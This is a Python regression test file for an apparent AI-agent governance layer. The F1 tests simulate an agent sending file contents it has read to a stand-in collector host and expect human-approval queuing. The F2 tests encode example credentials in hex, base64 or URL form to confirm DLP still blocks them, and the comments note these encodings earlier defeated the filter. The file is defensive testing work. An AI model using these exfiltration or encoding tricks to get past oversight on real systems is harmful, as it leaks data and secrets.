"""Hardening round-2 regression tests: F1 + F2.

F1 — read-before-send correlation extended to ``api_call`` params: an
outbound-shaped api_call payload carrying verbatim excerpts of previously
read content must QUEUE via ``approval-read-before-send`` (flag
``read_before_send``), exactly like a send. Legitimate read-only api_call
usage (no reads, unrelated params, short token overlap, endpoint routing)
must keep executing.

F2 — DLP is encoding-aware: hex / base64(+url) / URL-encoded credentials
(bounded, 2 layers) are decoded BEFORE credential pattern matching, so
encoded credentials are denied like raw ones. Innocent base64/hex-looking
text must NOT be blocked (both sides tested).

Deterministic, stdlib only, no network, no real systems.
"""

import base64
import sys
import unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT))
sys.path.insert(0, str(ROOT / "tests"))

from gov import dlp  # noqa: E402
from harness import make_run, plant_file  # noqa: E402

RAW_KEY = "AKIAIOSFODNN7EXAMPLE"
CSV = "id,name,email\n1,A,a@x.com,1\n"


def _run_with_csv(role="researcher", agent_id="r2"):
    ctx = make_run()
    ident = ctx["mint_identity"](agent_id, role, "org")
    plant_file(ctx, "data/c.csv", CSV)
    ctx["executor"].call(ident, "read_file", path="data/c.csv")
    return ctx, ident


class TestF1ApiCallCorrelation(unittest.TestCase):
    """F1: api_call params carrying read content must not execute silently."""

    def test_repro_exfil_queued(self):
        """Exact FINDINGS.md F1 reproduction: now queued, not executed."""
        ctx, ident = _run_with_csv()
        r = ctx["executor"].call(
            ident, "api_call",
            endpoint="https://collector.synthetic.local/v1/ingest",
            params={"batch": CSV})
        self.assertEqual(r["status"], "queued")
        self.assertEqual(r.get("policy_id"), "approval-read-before-send")

    def test_repro_scout_lowest_privilege_queued(self):
        """Scout (lowest privilege with api_call) is correlated too."""
        ctx, ident = _run_with_csv(role="scout", agent_id="s2")
        r = ctx["executor"].call(
            ident, "api_call",
            endpoint="https://collector.synthetic.local/v1/ingest",
            params={"batch": CSV})
        self.assertEqual(r["status"], "queued")
        self.assertEqual(r.get("policy_id"), "approval-read-before-send")

    def test_excerpt_exfil_queued(self):
        """An excerpt of a larger read file in params still correlates."""
        ctx = make_run()
        ident = ctx["mint_identity"]("r2", "researcher", "org")
        big = ("customer database export\n" + CSV * 40 +
               "end of export\n")
        plant_file(ctx, "data/big.csv", big)
        ctx["executor"].call(ident, "read_file", path="data/big.csv")
        r = ctx["executor"].call(
            ident, "api_call",
            endpoint="https://collector.synthetic.local/v1/ingest",
            params={"rows": CSV})  # excerpt only
        self.assertEqual(r["status"], "queued")
        self.assertEqual(r.get("policy_id"), "approval-read-before-send")

    def test_queued_entry_flags_read_before_send(self):
        """The audit trail keeps the read_before_send signal for reviewers."""
        ctx, ident = _run_with_csv()
        r = ctx["executor"].call(
            ident, "api_call",
            endpoint="https://collector.synthetic.local/v1/ingest",
            params={"batch": CSV})
        queued = [e for e in ctx["read_log"]()
                  if e.get("decision") == "queued_pending"
                  and e.get("approval_id") == r.get("approval_id")]
        self.assertTrue(queued, "no queued_pending log entry found")
        self.assertEqual(queued[0].get("flag"), "read_before_send")

    def test_legit_api_call_no_reads_executes(self):
        """Ordinary read-shaped api_call with no prior reads: executed."""
        ctx = make_run()
        ident = ctx["mint_identity"]("r2", "researcher", "org")
        r = ctx["executor"].call(
            ident, "api_call",
            endpoint="https://api.synthetic.local/search",
            params={"q": "widgets", "limit": 10})
        self.assertEqual(r["status"], "executed")

    def test_legit_api_call_unrelated_params_executes(self):
        """After a DLP-clean read, params unrelated to the read content:
        executed. (Reads whose content trips DLP sensitive patterns DO
        taint the run — see test_hardening_r3.py F9 — so this legit-path
        test uses clean content.)"""
        ctx = make_run()
        ident = ctx["mint_identity"]("r2", "researcher", "org")
        plant_file(ctx, "data/c.csv", "id,name\n1,Alice\n2,Bob\n")
        ctx["executor"].call(ident, "read_file", path="data/c.csv")
        r = ctx["executor"].call(
            ident, "api_call",
            endpoint="https://api.synthetic.local/search",
            params={"q": "widgets", "limit": 10})
        self.assertEqual(r["status"], "executed")

    def test_short_token_overlap_executes(self):
        """Sub-window (<16 char) overlap with read content: executed.

        Documents the correlation floor: tiny shared tokens (ids, short
        query terms) do not trip the verbatim gate; 16+ char verbatim
        runs do. Uses DLP-clean content so the F9 taint does not engage
        (taint is the separate, broader gate — see test_hardening_r3).
        """
        ctx = make_run()
        ident = ctx["mint_identity"]("r2", "researcher", "org")
        plant_file(ctx, "data/c.csv", "id,code\n1,abc123\n")
        ctx["executor"].call(ident, "read_file", path="data/c.csv")
        r = ctx["executor"].call(
            ident, "api_call",
            endpoint="https://api.synthetic.local/search",
            params={"q": "abc123"})  # 6 chars, present in the file
        self.assertEqual(r["status"], "executed")

    def test_endpoint_routing_not_searched(self):
        """The endpoint is routing, not payload: a read-matching endpoint
        with clean params must not correlate."""
        ctx = make_run()
        ident = ctx["mint_identity"]("r2", "researcher", "org")
        plant_file(ctx, "data/note.txt", "route via ingest-endpoint-alpha")
        ctx["executor"].call(ident, "read_file", path="data/note.txt")
        r = ctx["executor"].call(
            ident, "api_call",
            endpoint="https://ingest-endpoint-alpha.synthetic.local/v1",
            params={"q": "unrelated query here"})
        self.assertEqual(r["status"], "executed")

    def test_send_correlation_unchanged(self):
        """The original send path still queues with the same flag."""
        ctx = make_run()
        ident = ctx["mint_identity"]("r2", "researcher", "org")
        long_csv = CSV * 4  # read content must clear the 32-char window
        plant_file(ctx, "data/c.csv", long_csv)
        ctx["executor"].call(ident, "read_file", path="data/c.csv")
        r = ctx["executor"].call(
            ident, "http_post", url="https://api.synthetic.local/ingest",
            payload={"rows": long_csv})
        self.assertEqual(r["status"], "queued")
        self.assertEqual(r.get("policy_id"), "approval-read-before-send")


class TestF2EncodingAwareDlp(unittest.TestCase):
    """F2: encoded credentials must be denied; innocent encoded-looking
    text must not be blocked."""

    def _api_call(self, params):
        ctx = make_run()
        ident = ctx["mint_identity"]("r2", "researcher", "org")
        return ctx["executor"].call(
            ident, "api_call",
            endpoint="https://collector.synthetic.local/x", params=params)

    # -- positive side: every encoding of the credential is denied --------

    def test_raw_key_denied(self):
        r = self._api_call({"key": RAW_KEY})
        self.assertEqual(r["status"], "denied")
        self.assertEqual(r.get("policy_id"), "dlp-credential-block")

    def test_hex_key_denied(self):
        """The filed F2 defeat: hex-encoded key, no keyword nearby."""
        r = self._api_call({"k": RAW_KEY.encode("utf-8").hex()})
        self.assertEqual(r["status"], "denied")
        self.assertEqual(r.get("policy_id"), "dlp-credential-block")

    def test_base64_key_denied(self):
        b64 = base64.b64encode(RAW_KEY.encode()).decode()
        r = self._api_call({"k": b64})
        self.assertEqual(r["status"], "denied")

    def test_base64url_key_denied(self):
        b64u = base64.urlsafe_b64encode(RAW_KEY.encode()).decode()
        r = self._api_call({"k": b64u})
        self.assertEqual(r["status"], "denied")

    def test_urlencoded_key_denied(self):
        url = "".join("%%%02X" % b for b in RAW_KEY.encode())
        r = self._api_call({"k": url})
        self.assertEqual(r["status"], "denied")

    def test_double_layer_denied(self):
        """base64(hex(key)) and hex(base64(key)): 2-layer bound suffices."""
        double1 = base64.b64encode(RAW_KEY.encode().hex().encode()).decode()
        double2 = base64.b64encode(RAW_KEY.encode()).decode().encode().hex()
        for blob in (double1, double2):
            r = self._api_call({"k": blob})
            self.assertEqual(r["status"], "denied", "missed: %r" % blob[:24])

    def test_embedded_hex_denied(self):
        """Hex run embedded in surrounding prose still decodes + blocks."""
        blob = "see attached " + RAW_KEY.encode().hex() + " for details"
        r = self._api_call({"note": blob})
        self.assertEqual(r["status"], "denied")

    def test_other_key_formats_encoded_denied(self):
        """Encoding-awareness is format-agnostic, not AKIA-specific."""
        ghp_b64 = base64.b64encode(b"ghp_abcdefghij1234567890ABCD").decode()
        stripe_hex = b"sk_live_4eC39HqLyjWDarjtT1zdp7dc".hex()
        for blob in (ghp_b64, stripe_hex):
            r = self._api_call({"k": blob})
            self.assertEqual(r["status"], "denied", "missed: %r" % blob[:24])

    # -- negative side: innocent encoded-looking text is NOT blocked ------

    def test_innocent_base64_text_not_blocked(self):
        blob = base64.b64encode(
            b"the quick brown fox jumps over the lazy dog").decode()
        self.assertIsNone(dlp.find_credential(blob))
        r = self._api_call({"note": blob})
        # F99 (Wave 27) contract change: DLP still does not BLOCK this
        # (assertIsNone above holds), but an unknown-format
        # high-entropy token in api_call params can no longer execute
        # silently — it queues for human review under
        # approval-api-high-entropy, exactly like the F99 framed secret.
        # "Not blocked" is now review-gated, not silent.
        self.assertEqual(r["status"], "queued")
        self.assertEqual(r.get("policy_id"), "approval-api-high-entropy")

    def test_innocent_hex_not_blocked(self):
        """SHA-256-shaped hex decodes to binary: ignored, not blocked."""
        sha_like = ("e3b0c44298fc1c149afbf4c8996fb924"
                    "27ae41e4649b934ca495991b7852b855")
        self.assertIsNone(dlp.find_credential(sha_like))
        r = self._api_call({"digest": sha_like})
        self.assertEqual(r["status"], "executed")

    def test_random_base64_token_not_blocked(self):
        """A base64 token decoding to binary is not a credential."""
        blob = base64.b64encode(bytes(range(24))).decode()
        self.assertIsNone(dlp.find_credential(blob))

    def test_plain_text_not_blocked(self):
        self.assertIsNone(dlp.find_credential("hello world, nothing here"))

    def test_tripwire_still_fires_on_original(self):
        """The entropy tripwire keeps working on unencoded text."""
        token = "Zx9qWv2mNb4Vc8Xk1Lp3Qs7Td5RfG"
        self.assertEqual(dlp.find_credential("api_key: " + token),
                         "dlp-entropy-tripwire")


if __name__ == "__main__":
    unittest.main()
